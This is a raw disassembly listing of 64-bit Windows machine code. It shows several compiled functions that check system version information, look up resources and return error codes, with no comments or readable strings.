   140003b87:	33 d2                	xor    %edx,%edx
   140003b89:	48 ff 15 e0 59 00 00 	rex.W call *0x59e0(%rip)        # 0x140009570
   140003b90:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140003b95:	85 c0                	test   %eax,%eax
   140003b97:	74 b3                	je     0x140003b4c
   140003b99:	83 7c 24 38 12       	cmpl   $0x12,0x38(%rsp)
   140003b9e:	75 07                	jne    0x140003ba7
   140003ba0:	bb 01 00 00 00       	mov    $0x1,%ebx
   140003ba5:	eb 11                	jmp    0x140003bb8
   140003ba7:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140003bac:	48 ff 15 05 59 00 00 	rex.W call *0x5905(%rip)        # 0x1400094b8
   140003bb3:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140003bb8:	45 33 c9             	xor    %r9d,%r9d
   140003bbb:	c7 44 24 20 01 00 00 	movl   $0x1,0x20(%rsp)
   140003bc2:	00 
   140003bc3:	45 33 c0             	xor    %r8d,%r8d
   140003bc6:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140003bcb:	33 d2                	xor    %edx,%edx
   140003bcd:	48 ff 15 9c 59 00 00 	rex.W call *0x599c(%rip)        # 0x140009570
   140003bd4:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140003bd9:	85 c0                	test   %eax,%eax
   140003bdb:	75 bc                	jne    0x140003b99
   140003bdd:	85 db                	test   %ebx,%ebx
   140003bdf:	0f 84 67 ff ff ff    	je     0x140003b4c
   140003be5:	48 83 c4 60          	add    $0x60,%rsp
   140003be9:	5b                   	pop    %rbx
   140003bea:	c3                   	ret
   140003beb:	cc                   	int3
   140003bec:	cc                   	int3
   140003bed:	cc                   	int3
   140003bee:	cc                   	int3
   140003bef:	cc                   	int3
   140003bf0:	cc                   	int3
   140003bf1:	cc                   	int3
   140003bf2:	cc                   	int3
   140003bf3:	cc                   	int3
   140003bf4:	48 8b c4             	mov    %rsp,%rax
   140003bf7:	48 89 58 10          	mov    %rbx,0x10(%rax)
   140003bfb:	48 89 70 18          	mov    %rsi,0x18(%rax)
   140003bff:	48 89 78 20          	mov    %rdi,0x20(%rax)
   140003c03:	55                   	push   %rbp
   140003c04:	41 54                	push   %r12
   140003c06:	41 55                	push   %r13
   140003c08:	41 56                	push   %r14
   140003c0a:	41 57                	push   %r15
   140003c0c:	48 8d a8 d8 fe ff ff 	lea    -0x128(%rax),%rbp
   140003c13:	48 81 ec 00 02 00 00 	sub    $0x200,%rsp
   140003c1a:	48 8b 05 e7 83 00 00 	mov    0x83e7(%rip),%rax        # 0x14000c008
   140003c21:	48 33 c4             	xor    %rsp,%rax
   140003c24:	48 89 85 f0 00 00 00 	mov    %rax,0xf0(%rbp)
   140003c2b:	4c 8b e9             	mov    %rcx,%r13
   140003c2e:	c7 44 24 40 94 00 00 	movl   $0x94,0x40(%rsp)
   140003c35:	00 
   140003c36:	33 db                	xor    %ebx,%ebx
   140003c38:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140003c3d:	8b fb                	mov    %ebx,%edi
   140003c3f:	48 ff 15 0a 57 00 00 	rex.W call *0x570a(%rip)        # 0x140009350
   140003c46:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140003c4b:	85 c0                	test   %eax,%eax
   140003c4d:	75 0a                	jne    0x140003c59
   140003c4f:	bf b4 04 00 00       	mov    $0x4b4,%edi
   140003c54:	e9 26 02 00 00       	jmp    0x140003e7f
   140003c59:	8b 44 24 50          	mov    0x50(%rsp),%eax
   140003c5d:	b9 02 00 00 00       	mov    $0x2,%ecx
   140003c62:	44 8b 74 24 48       	mov    0x48(%rsp),%r14d
   140003c67:	8b 54 24 44          	mov    0x44(%rsp),%edx
   140003c6b:	83 e8 01             	sub    $0x1,%eax
   140003c6e:	74 63                	je     0x140003cd3
   140003c70:	83 f8 01             	cmp    $0x1,%eax
   140003c73:	74 0a                	je     0x140003c7f
   140003c75:	bf ca 04 00 00       	mov    $0x4ca,%edi
   140003c7a:	e9 00 02 00 00       	jmp    0x140003e7f
   140003c7f:	be 01 00 00 00       	mov    $0x1,%esi
   140003c84:	66 89 0d ed a1 00 00 	mov    %cx,0xa1ed(%rip)        # 0x14000de78
   140003c8b:	0f b7 c1             	movzwl %cx,%eax
   140003c8e:	89 35 18 85 00 00    	mov    %esi,0x8518(%rip)        # 0x14000c1ac
   140003c94:	89 35 0e 85 00 00    	mov    %esi,0x850e(%rip)        # 0x14000c1a8
   140003c9a:	8d 4e 02             	lea    0x2(%rsi),%ecx
   140003c9d:	3b d1                	cmp    %ecx,%edx
   140003c9f:	77 21                	ja     0x140003cc2
   140003ca1:	8b c6                	mov    %esi,%eax
   140003ca3:	66 89 05 ce a1 00 00 	mov    %ax,0xa1ce(%rip)        # 0x14000de78
   140003caa:	72 08                	jb     0x140003cb4
   140003cac:	75 40                	jne    0x140003cee
   140003cae:	41 83 fe 33          	cmp    $0x33,%r14d
   140003cb2:	73 3a                	jae    0x140003cee
   140003cb4:	89 1d f2 84 00 00    	mov    %ebx,0x84f2(%rip)        # 0x14000c1ac
   140003cba:	89 1d e8 84 00 00    	mov    %ebx,0x84e8(%rip)        # 0x14000c1a8
   140003cc0:	eb 2c                	jmp    0x140003cee
   140003cc2:	83 fa 05             	cmp    $0x5,%edx
   140003cc5:	72 27                	jb     0x140003cee
   140003cc7:	0f b7 c1             	movzwl %cx,%eax
   140003cca:	66 89 0d a7 a1 00 00 	mov    %cx,0xa1a7(%rip)        # 0x14000de78
   140003cd1:	eb 1b                	jmp    0x140003cee
   140003cd3:	be 01 00 00 00       	mov    $0x1,%esi
   140003cd8:	66 89 1d 99 a1 00 00 	mov    %bx,0xa199(%rip)        # 0x14000de78
   140003cdf:	89 35 c7 84 00 00    	mov    %esi,0x84c7(%rip)        # 0x14000c1ac
   140003ce5:	0f b7 c3             	movzwl %bx,%eax
   140003ce8:	89 35 ba 84 00 00    	mov    %esi,0x84ba(%rip)        # 0x14000c1a8
   140003cee:	39 1d 20 90 00 00    	cmp    %ebx,0x9020(%rip)        # 0x14000cd14
   140003cf4:	0f 85 3a 02 00 00    	jne    0x140003f34
   140003cfa:	4d 85 ed             	test   %r13,%r13
   140003cfd:	0f 84 31 02 00 00    	je     0x140003f34
   140003d03:	44 0f b7 7c 24 4c    	movzwl 0x4c(%rsp),%r15d
   140003d09:	4d 8d 65 40          	lea    0x40(%r13),%r12
   140003d0d:	66 f7 d8             	neg    %ax
   140003d10:	89 5c 24 30          	mov    %ebx,0x30(%rsp)
   140003d14:	44 8b d3             	mov    %ebx,%r10d
   140003d17:	44 8b db             	mov    %ebx,%r11d
   140003d1a:	48 1b c0             	sbb    %rax,%rax
   140003d1d:	48 83 e0 c4          	and    $0xffffffffffffffc4,%rax
   140003d21:	4c 03 e0             	add    %rax,%r12
   140003d24:	4d 63 cb             	movslq %r11d,%r9
   140003d27:	83 c8 ff             	or     $0xffffffff,%eax
   140003d2a:	4f 8d 04 49          	lea    (%r9,%r9,2),%r8
   140003d2e:	43 3b 14 c4          	cmp    (%r12,%r8,8),%edx
   140003d32:	73 04                	jae    0x140003d38
   140003d34:	8b c8                	mov    %eax,%ecx
   140003d36:	eb 12                	jmp    0x140003d4a
   140003d38:	76 04                	jbe    0x140003d3e
   140003d3a:	8b ce                	mov    %esi,%ecx
   140003d3c:	eb 0c                	jmp    0x140003d4a
   140003d3e:	47 3b 74 c4 04       	cmp    0x4(%r12,%r8,8),%r14d
   140003d43:	72 ef                	jb     0x140003d34
   140003d45:	8b cb                	mov    %ebx,%ecx
   140003d47:	0f 97 c1             	seta   %cl
   140003d4a:	43 3b 54 c4 0c       	cmp    0xc(%r12,%r8,8),%edx
   140003d4f:	72 12                	jb     0x140003d63
   140003d51:	76 04                	jbe    0x140003d57
   140003d53:	8b c6                	mov    %esi,%eax
   140003d55:	eb 0c                	jmp    0x140003d63
   140003d57:	47 3b 74 c4 10       	cmp    0x10(%r12,%r8,8),%r14d
   140003d5c:	72 05                	jb     0x140003d63
   140003d5e:	8b c3                	mov    %ebx,%eax
   140003d60:	0f 97 c0             	seta   %al
   140003d63:	85 c9                	test   %ecx,%ecx
   140003d65:	0f 88 ac 00 00 00    	js     0x140003e17
   140003d6b:	85 c0                	test   %eax,%eax
   140003d6d:	0f 8f a4 00 00 00    	jg     0x140003e17
   140003d73:	85 c9                	test   %ecx,%ecx
   140003d75:	75 22                	jne    0x140003d99
   140003d77:	85 c0                	test   %eax,%eax
   140003d79:	75 11                	jne    0x140003d8c
   140003d7b:	41 8b c7             	mov    %r15d,%eax
   140003d7e:	47 3b 7c c4 08       	cmp    0x8(%r12,%r8,8),%r15d
   140003d83:	72 27                	jb     0x140003dac
   140003d85:	43 3b 44 c4 14       	cmp    0x14(%r12,%r8,8),%eax
   140003d8a:	eb 1a                	jmp    0x140003da6
   140003d8c:	47 3b 7c c4 08       	cmp    0x8(%r12,%r8,8),%r15d
   140003d91:	0f 83 a5 00 00 00    	jae    0x140003e3c
   140003d97:	eb 13                	jmp    0x140003dac
   140003d99:	85 c0                	test   %eax,%eax
   140003d9b:	0f 85 9b 00 00 00    	jne    0x140003e3c
   140003da1:	47 3b 7c c4 14       	cmp    0x14(%r12,%r8,8),%r15d
   140003da6:	0f 86 90 00 00 00    	jbe    0x140003e3c
   140003dac:	45 85 db             	test   %r11d,%r11d
   140003daf:	74 6b                	je     0x140003e1c
   140003db1:	bf 4c 05 00 00       	mov    $0x54c,%edi
   140003db6:	4c 8b cb             	mov    %rbx,%r9
   140003db9:	4c 8b fb             	mov    %rbx,%r15
   140003dbc:	44 8b f3             	mov    %ebx,%r14d
   140003dbf:	81 ff 4d 05 00 00    	cmp    $0x54d,%edi
   140003dc5:	75 1f                	jne    0x140003de6
   140003dc7:	41 8b 95 80 00 00 00 	mov    0x80(%r13),%edx
   140003dce:	4c 8d 4d e0          	lea    -0x20(%rbp),%r9
   140003dd2:	49 63 c2             	movslq %r10d,%rax
   140003dd5:	48 81 c2 84 00 00 00 	add    $0x84,%rdx
   140003ddc:	4c 6b e0 3c          	imul   $0x3c,%rax,%r12
   140003de0:	4d 03 e5             	add    %r13,%r12
   140003de3:	4c 03 e2             	add    %rdx,%r12
   140003de6:	4d 85 e4             	test   %r12,%r12
   140003de9:	0f 84 b5 00 00 00    	je     0x140003ea4
   140003def:	41 8b 44 24 34       	mov    0x34(%r12),%eax
   140003df4:	4d 8d bd 84 00 00 00 	lea    0x84(%r13),%r15
   140003dfb:	4c 03 f8             	add    %rax,%r15
   140003dfe:	41 8b 44 24 30       	mov    0x30(%r12),%eax
   140003e03:	40 84 c6             	test   %al,%sil
   140003e06:	0f 84 8a 00 00 00    	je     0x140003e96
   140003e0c:	41 be 04 01 00 00    	mov    $0x104,%r14d
   140003e12:	e9 8d 00 00 00       	jmp    0x140003ea4
   140003e17:	44 3b de             	cmp    %esi,%r11d
   140003e1a:	74 17                	je     0x140003e33
   140003e1c:	45 8d 53 01          	lea    0x1(%r11),%r10d
   140003e20:	44 89 54 24 30       	mov    %r10d,0x30(%rsp)
   140003e25:	45 8b da             	mov    %r10d,%r11d
   140003e28:	41 83 fa 02          	cmp    $0x2,%r10d
   140003e2c:	7d 0a                	jge    0x140003e38
   140003e2e:	e9 f1 fe ff ff       	jmp    0x140003d24
   140003e33:	bf 4c 05 00 00       	mov    $0x54c,%edi
   140003e38:	85 ff                	test   %edi,%edi
   140003e3a:	75 2d                	jne    0x140003e69
   140003e3c:	41 39 5d 7c          	cmp    %ebx,0x7c(%r13)
   140003e40:	0f 84 ee 00 00 00    	je     0x140003f34
   140003e46:	4c 8d 4c 24 30       	lea    0x30(%rsp),%r9
   140003e4b:	49 8b cd             	mov    %r13,%rcx
   140003e4e:	48 8d 55 e0          	lea    -0x20(%rbp),%rdx
   140003e52:	e8 dd e9 ff ff       	call   0x140002834
   140003e57:	85 c0                	test   %eax,%eax
   140003e59:	0f 85 d5 00 00 00    	jne    0x140003f34
   140003e5f:	44 8b 54 24 30       	mov    0x30(%rsp),%r10d
   140003e64:	bf 4d 05 00 00       	mov    $0x54d,%edi
   140003e69:	8d 87 b4 fa ff ff    	lea    -0x54c(%rdi),%eax
   140003e6f:	3b c6                	cmp    %esi,%eax
   140003e71:	0f 86 3f ff ff ff    	jbe    0x140003db6
   140003e77:	85 ff                	test   %edi,%edi
   140003e79:	0f 84 b7 00 00 00    	je     0x140003f36
   140003e7f:	45 33 c9             	xor    %r9d,%r9d
   140003e82:	89 5c 24 28          	mov    %ebx,0x28(%rsp)
   140003e86:	45 33 c0             	xor    %r8d,%r8d
   140003e89:	c7 44 24 20 10 00 00 	movl   $0x10,0x20(%rsp)
   140003e90:	00 
   140003e91:	e9 95 00 00 00       	jmp    0x140003f2b
   140003e96:	24 02                	and    $0x2,%al
   140003e98:	f6 d8                	neg    %al
   140003e9a:	45 1b f6             	sbb    %r14d,%r14d
   140003e9d:	41 81 e6 01 01 00 00 	and    $0x101,%r14d
   140003ea4:	40 84 35 6d 8e 00 00 	test   %sil,0x8e6d(%rip)        # 0x14000cd18
   140003eab:	75 6a                	jne    0x140003f17
   140003ead:	4d 85 ff             	test   %r15,%r15
   140003eb0:	74 65                	je     0x140003f17
   140003eb2:	41 38 1f             	cmp    %bl,(%r15)
   140003eb5:	74 60                	je     0x140003f17
   140003eb7:	33 c9                	xor    %ecx,%ecx
   140003eb9:	48 ff 15 88 56 00 00 	rex.W call *0x5688(%rip)        # 0x140009548
   140003ec0:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140003ec5:	e8 3a 40 00 00       	call   0x140007f04
   140003eca:	85 c0                	test   %eax,%eax
   140003ecc:	74 0e                	je     0x140003edc
   140003ece:	e8 61 3f 00 00       	call   0x140007e34
   140003ed3:	85 c0                	test   %eax,%eax
   140003ed5:	b8 30 00 18 00       	mov    $0x180030,%eax
   140003eda:	75 05                	jne    0x140003ee1
   140003edc:	b8 30 00 00 00       	mov    $0x30,%eax
   140003ee1:	41 0b c6             	or     %r14d,%eax
   140003ee4:	4c 8d 05 8d 96 00 00 	lea    0x968d(%rip),%r8        # 0x14000d578
   140003eeb:	44 8b c8             	mov    %eax,%r9d
   140003eee:	49 8b d7             	mov    %r15,%rdx
   140003ef1:	33 c9                	xor    %ecx,%ecx
   140003ef3:	48 ff 15 de 55 00 00 	rex.W call *0x55de(%rip)        # 0x1400094d8
   140003efa:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140003eff:	41 f6 c6 04          	test   $0x4,%r14b
   140003f03:	74 05                	je     0x140003f0a
   140003f05:	83 f8 06             	cmp    $0x6,%eax
   140003f08:	eb 07                	jmp    0x140003f11
   140003f0a:	44 84 f6             	test   %r14b,%sil
   140003f0d:	74 25                	je     0x140003f34
   140003f0f:	3b c6                	cmp    %esi,%eax
   140003f11:	75 21                	jne    0x140003f34
   140003f13:	8b fb                	mov    %ebx,%edi
   140003f15:	eb 1d                	jmp    0x140003f34
   140003f17:	b8 30 00 00 00       	mov    $0x30,%eax
   140003f1c:	89 5c 24 28          	mov    %ebx,0x28(%rsp)
   140003f20:	89 44 24 20          	mov    %eax,0x20(%rsp)
   140003f24:	4c 8d 05 4d 96 00 00 	lea    0x964d(%rip),%r8        # 0x14000d578
   140003f2b:	8b d7                	mov    %edi,%edx
   140003f2d:	33 c9                	xor    %ecx,%ecx
   140003f2f:	e8 98 0e 00 00       	call   0x140004dcc
   140003f34:	85 ff                	test   %edi,%edi
   140003f36:	0f 94 c3             	sete   %bl
   140003f39:	8b c3                	mov    %ebx,%eax
   140003f3b:	48 8b 8d f0 00 00 00 	mov    0xf0(%rbp),%rcx
   140003f42:	48 33 cc             	xor    %rsp,%rcx
   140003f45:	e8 26 45 00 00       	call   0x140008470
   140003f4a:	4c 8d 9c 24 00 02 00 	lea    0x200(%rsp),%r11
   140003f51:	00 
   140003f52:	49 8b 5b 38          	mov    0x38(%r11),%rbx
   140003f56:	49 8b 73 40          	mov    0x40(%r11),%rsi
   140003f5a:	49 8b 7b 48          	mov    0x48(%r11),%rdi
   140003f5e:	49 8b e3             	mov    %r11,%rsp
   140003f61:	41 5f                	pop    %r15
   140003f63:	41 5e                	pop    %r14
   140003f65:	41 5d                	pop    %r13
   140003f67:	41 5c                	pop    %r12
   140003f69:	5d                   	pop    %rbp
   140003f6a:	c3                   	ret
   140003f6b:	cc                   	int3
   140003f6c:	cc                   	int3
   140003f6d:	cc                   	int3
   140003f6e:	cc                   	int3
   140003f6f:	cc                   	int3
   140003f70:	cc                   	int3
   140003f71:	cc                   	int3
   140003f72:	cc                   	int3
   140003f73:	cc                   	int3
   140003f74:	40 53                	rex push %rbx
   140003f76:	48 83 ec 30          	sub    $0x30,%rsp
   140003f7a:	45 33 c0             	xor    %r8d,%r8d
   140003f7d:	48 8d 0d 1c 59 00 00 	lea    0x591c(%rip),%rcx        # 0x1400098a0
   140003f84:	33 d2                	xor    %edx,%edx
   140003f86:	e8 c5 10 00 00       	call   0x140005050
   140003f8b:	b9 40 00 00 00       	mov    $0x40,%ecx
   140003f90:	8b d8                	mov    %eax,%ebx
   140003f92:	8d 50 01             	lea    0x1(%rax),%edx
   140003f95:	48 ff 15 2c 54 00 00 	rex.W call *0x542c(%rip)        # 0x1400093c8
   140003f9c:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140003fa1:	48 89 05 88 90 00 00 	mov    %rax,0x9088(%rip)        # 0x14000d030
   140003fa8:	48 85 c0             	test   %rax,%rax
   140003fab:	75 30                	jne    0x140003fdd
   140003fad:	21 44 24 28          	and    %eax,0x28(%rsp)
   140003fb1:	45 33 c9             	xor    %r9d,%r9d
   140003fb4:	45 33 c0             	xor    %r8d,%r8d
   140003fb7:	c7 44 24 20 10 00 00 	movl   $0x10,0x20(%rsp)
   140003fbe:	00 
   140003fbf:	ba b5 04 00 00       	mov    $0x4b5,%edx
   140003fc4:	33 c9                	xor    %ecx,%ecx
   140003fc6:	e8 01 0e 00 00       	call   0x140004dcc
   140003fcb:	e8 30 37 00 00       	call   0x140007700
   140003fd0:	89 05 6e 95 00 00    	mov    %eax,0x956e(%rip)        # 0x14000d544
   140003fd6:	33 c0                	xor    %eax,%eax
   140003fd8:	e9 da 00 00 00       	jmp    0x1400040b7
   140003fdd:	44 8b c3             	mov    %ebx,%r8d
   140003fe0:	48 8d 0d b9 58 00 00 	lea    0x58b9(%rip),%rcx        # 0x1400098a0
   140003fe7:	48 8b d0             	mov    %rax,%rdx
   140003fea:	e8 61 10 00 00       	call   0x140005050
   140003fef:	85 c0                	test   %eax,%eax
   140003ff1:	75 3d                	jne    0x140004030
   140003ff3:	21 44 24 28          	and    %eax,0x28(%rsp)
   140003ff7:	45 33 c9             	xor    %r9d,%r9d
   140003ffa:	45 33 c0             	xor    %r8d,%r8d
   140003ffd:	c7 44 24 20 10 00 00 	movl   $0x10,0x20(%rsp)
   140004004:	00 
   140004005:	ba b1 04 00 00       	mov    $0x4b1,%edx
   14000400a:	33 c9                	xor    %ecx,%ecx
   14000400c:	e8 bb 0d 00 00       	call   0x140004dcc
   140004011:	48 8b 0d 18 90 00 00 	mov    0x9018(%rip),%rcx        # 0x14000d030
   140004018:	48 ff 15 51 52 00 00 	rex.W call *0x5251(%rip)        # 0x140009270
   14000401f:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140004024:	c7 05 16 95 00 00 14 	movl   $0x80070714,0x9516(%rip)        # 0x14000d544
   14000402b:	07 07 80 
   14000402e:	eb a6                	jmp    0x140003fd6
   140004030:	48 8b 0d f9 8f 00 00 	mov    0x8ff9(%rip),%rcx        # 0x14000d030
   140004037:	48 8d 15 6a 58 00 00 	lea    0x586a(%rip),%rdx        # 0x1400098a8
   14000403e:	48 ff 15 8b 53 00 00 	rex.W call *0x538b(%rip)        # 0x1400093d0
   140004045:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000404a:	85 c0                	test   %eax,%eax
   14000404c:	74 4a                	je     0x140004098
   14000404e:	48 83 64 24 28 00    	andq   $0x0,0x28(%rsp)
   140004054:	4c 8d 0d 95 f3 ff ff 	lea    -0xc6b(%rip),%r9        # 0x1400033f0
   14000405b:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   140004061:	45 33 c0             	xor    %r8d,%r8d
   140004064:	ba d1 07 00 00       	mov    $0x7d1,%edx
   140004069:	e8 5a 3a 00 00       	call   0x140007ac8
   14000406e:	48 8b 0d bb 8f 00 00 	mov    0x8fbb(%rip),%rcx        # 0x14000d030
   140004075:	48 8b d8             	mov    %rax,%rbx
   140004078:	48 ff 15 f1 51 00 00 	rex.W call *0x51f1(%rip)        # 0x140009270
   14000407f:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140004084:	48 85 db             	test   %rbx,%rbx
   140004087:	75 22                	jne    0x1400040ab
   140004089:	c7 05 b1 94 00 00 c7 	movl   $0x800704c7,0x94b1(%rip)        # 0x14000d544
   140004090:	04 07 80 
   140004093:	e9 3e ff ff ff       	jmp    0x140003fd6
   140004098:	48 8b 0d 91 8f 00 00 	mov    0x8f91(%rip),%rcx        # 0x14000d030
   14000409f:	48 ff 15 ca 51 00 00 	rex.W call *0x51ca(%rip)        # 0x140009270
   1400040a6:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400040ab:	83 25 92 94 00 00 00 	andl   $0x0,0x9492(%rip)        # 0x14000d544
   1400040b2:	b8 01 00 00 00       	mov    $0x1,%eax
   1400040b7:	48 83 c4 30          	add    $0x30,%rsp
   1400040bb:	5b                   	pop    %rbx
   1400040bc:	c3                   	ret
   1400040bd:	cc                   	int3
   1400040be:	cc                   	int3
   1400040bf:	cc                   	int3
   1400040c0:	cc                   	int3
   1400040c1:	cc                   	int3
   1400040c2:	cc                   	int3
   1400040c3:	cc                   	int3
   1400040c4:	48 8b c4             	mov    %rsp,%rax
   1400040c7:	48 89 58 08          	mov    %rbx,0x8(%rax)
   1400040cb:	48 89 70 10          	mov    %rsi,0x10(%rax)
   1400040cf:	48 89 78 18          	mov    %rdi,0x18(%rax)
   1400040d3:	55                   	push   %rbp
   1400040d4:	41 54                	push   %r12
   1400040d6:	41 55                	push   %r13
   1400040d8:	41 56                	push   %r14
   1400040da:	41 57                	push   %r15
   1400040dc:	48 8d a8 78 fb ff ff 	lea    -0x488(%rax),%rbp
   1400040e3:	48 81 ec 60 05 00 00 	sub    $0x560,%rsp
   1400040ea:	48 8b 05 17 7f 00 00 	mov    0x7f17(%rip),%rax        # 0x14000c008
   1400040f1:	48 33 c4             	xor    %rsp,%rax
   1400040f4:	48 89 85 50 04 00 00 	mov    %rax,0x450(%rbp)
   1400040fb:	45 33 ed             	xor    %r13d,%r13d
   1400040fe:	44 39 2d 03 8c 00 00 	cmp    %r13d,0x8c03(%rip)        # 0x14000cd08
   140004105:	45 8b fd             	mov    %r13d,%r15d
   140004108:	45 8b e5             	mov    %r13d,%r12d
   14000410b:	44 89 2d 32 94 00 00 	mov    %r13d,0x9432(%rip)        # 0x14000d544
   140004112:	41 8d 5d 03          	lea    0x3(%r13),%ebx
   140004116:	75 21                	jne    0x140004139
   140004118:	45 8d 45 04          	lea    0x4(%r13),%r8d
   14000411c:	48 8d 15 39 9d 00 00 	lea    0x9d39(%rip),%rdx        # 0x14000de5c
   140004123:	48 8d 0d 86 57 00 00 	lea    0x5786(%rip),%rcx        # 0x1400098b0
   14000412a:	e8 21 0f 00 00       	call   0x140005050
   14000412f:	ff c8                	dec    %eax
   140004131:	3b c3                	cmp    %ebx,%eax
   140004133:	0f 87 1b 01 00 00    	ja     0x140004254
   140004139:	45 8b f5             	mov    %r13d,%r14d
   14000413c:	bf 01 00 00 00       	mov    $0x1,%edi
   140004141:	48 83 ce ff          	or     $0xffffffffffffffff,%rsi
   140004145:	33 d2                	xor    %edx,%edx
   140004147:	44 89 6c 24 30       	mov    %r13d,0x30(%rsp)
   14000414c:	48 8d 4d 84          	lea    -0x7c(%rbp),%rcx
   140004150:	44 8d 42 64          	lea    0x64(%rdx),%r8d
   140004154:	e8 b0 49 00 00       	call   0x140008b09
   140004159:	44 38 2d c2 8d 00 00 	cmp    %r13b,0x8dc2(%rip)        # 0x14000cf22
   140004160:	c7 45 80 68 00 00 00 	movl   $0x68,-0x80(%rbp)
   140004167:	0f 85 15 01 00 00    	jne    0x140004282
   14000416d:	41 b8 04 00 00 00    	mov    $0x4,%r8d
   140004173:	48 8d 54 24 40       	lea    0x40(%rsp),%rdx
   140004178:	48 8d 0d 39 57 00 00 	lea    0x5739(%rip),%rcx        # 0x1400098b8
   14000417f:	e8 cc 0e 00 00       	call   0x140005050
   140004184:	ff c8                	dec    %eax
   140004186:	3b c3                	cmp    %ebx,%eax
   140004188:	0f 87 c6 00 00 00    	ja     0x140004254
   14000418e:	8b 44 24 40          	mov    0x40(%rsp),%eax
   140004192:	3b c7                	cmp    %edi,%eax
   140004194:	75 07                	jne    0x14000419d
   140004196:	66 44 89 6d c0       	mov    %r13w,-0x40(%rbp)
   14000419b:	eb 18                	jmp    0x1400041b5
   14000419d:	83 f8 02             	cmp    $0x2,%eax
   1400041a0:	75 0b                	jne    0x1400041ad
   1400041a2:	b8 06 00 00 00       	mov    $0x6,%eax
   1400041a7:	66 89 45 c0          	mov    %ax,-0x40(%rbp)
   1400041ab:	eb 08                	jmp    0x1400041b5
   1400041ad:	3b c3                	cmp    %ebx,%eax
   1400041af:	75 07                	jne    0x1400041b8
   1400041b1:	66 89 5d c0          	mov    %bx,-0x40(%rbp)
   1400041b5:	89 7d bc             	mov    %edi,-0x44(%rbp)
   1400041b8:	45 85 f6             	test   %r14d,%r14d
   1400041bb:	0f 85 04 01 00 00    	jne    0x1400042c5
   1400041c1:	0f b7 05 50 8b 00 00 	movzwl 0x8b50(%rip),%eax        # 0x14000cd18
   1400041c8:	66 85 c0             	test   %ax,%ax
   1400041cb:	74 64                	je     0x140004231
   1400041cd:	40 84 c7             	test   %al,%dil
   1400041d0:	74 09                	je     0x1400041db
   1400041d2:	48 8d 0d ef 56 00 00 	lea    0x56ef(%rip),%rcx        # 0x1400098c8
   1400041d9:	eb 0f                	jmp    0x1400041ea
   1400041db:	a8 02                	test   $0x2,%al
   1400041dd:	0f 84 0b 03 00 00    	je     0x1400044ee
   1400041e3:	48 8d 0d e6 56 00 00 	lea    0x56e6(%rip),%rcx        # 0x1400098d0
   1400041ea:	41 b8 04 01 00 00    	mov    $0x104,%r8d
   1400041f0:	48 8d 55 f0          	lea    -0x10(%rbp),%rdx
   1400041f4:	e8 57 0e 00 00       	call   0x140005050
   1400041f9:	85 c0                	test   %eax,%eax
   1400041fb:	74 57                	je     0x140004254
   1400041fd:	48 8d 05 a4 56 00 00 	lea    0x56a4(%rip),%rax        # 0x1400098a8
   140004204:	89 74 24 28          	mov    %esi,0x28(%rsp)
   140004208:	44 8b ce             	mov    %esi,%r9d
   14000420b:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140004210:	4c 8d 45 f0          	lea    -0x10(%rbp),%r8
   140004214:	8b d7                	mov    %edi,%edx
   140004216:	b9 7f 00 00 00       	mov    $0x7f,%ecx
   14000421b:	48 ff 15 d6 4f 00 00 	rex.W call *0x4fd6(%rip)        # 0x1400091f8
   140004222:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140004227:	83 e8 02             	sub    $0x2,%eax
   14000422a:	83 f8 fe             	cmp    $0xfffffffe,%eax
   14000422d:	44 0f 45 ff          	cmovne %edi,%r15d
   140004231:	45 85 ff             	test   %r15d,%r15d
   140004234:	0f 85 ee 00 00 00    	jne    0x140004328
   14000423a:	41 b8 04 01 00 00    	mov    $0x104,%r8d
   140004240:	48 8d 55 f0          	lea    -0x10(%rbp),%rdx
   140004244:	48 8d 0d 8d 56 00 00 	lea    0x568d(%rip),%rcx        # 0x1400098d8
   14000424b:	e8 00 0e 00 00       	call   0x140005050
   140004250:	85 c0                	test   %eax,%eax
   140004252:	75 71                	jne    0x1400042c5
   140004254:	44 89 6c 24 28       	mov    %r13d,0x28(%rsp)
   140004259:	45 33 c9             	xor    %r9d,%r9d
   14000425c:	45 33 c0             	xor    %r8d,%r8d
   14000425f:	c7 44 24 20 10 00 00 	movl   $0x10,0x20(%rsp)
   140004266:	00 
   140004267:	ba b1 04 00 00       	mov    $0x4b1,%edx
   14000426c:	33 c9                	xor    %ecx,%ecx
   14000426e:	e8 59 0b 00 00       	call   0x140004dcc
   140004273:	c7 05 c7 92 00 00 14 	movl   $0x80070714,0x92c7(%rip)        # 0x14000d544
   14000427a:	07 07 80 
   14000427d:	e9 6c 02 00 00       	jmp    0x1400044ee
   140004282:	4c 8d 05 99 8c 00 00 	lea    0x8c99(%rip),%r8        # 0x14000cf22
   140004289:	ba 04 01 00 00       	mov    $0x104,%edx
   14000428e:	48 8d 45 f0          	lea    -0x10(%rbp),%rax
   140004292:	4c 2b c0             	sub    %rax,%r8
   140004295:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   140004299:	48 8d 82 fa fe ff 7f 	lea    0x7ffffefa(%rdx),%rax
   1400042a0:	48 85 c0             	test   %rax,%rax
   1400042a3:	74 12                	je     0x1400042b7
   1400042a5:	41 8a 04 08          	mov    (%r8,%rcx,1),%al
   1400042a9:	84 c0                	test   %al,%al
   1400042ab:	74 0a                	je     0x1400042b7
   1400042ad:	88 01                	mov    %al,(%rcx)
   1400042af:	48 03 cf             	add    %rdi,%rcx
   1400042b2:	48 2b d7             	sub    %rdi,%rdx
   1400042b5:	75 e2                	jne    0x140004299
   1400042b7:	48 85 d2             	test   %rdx,%rdx
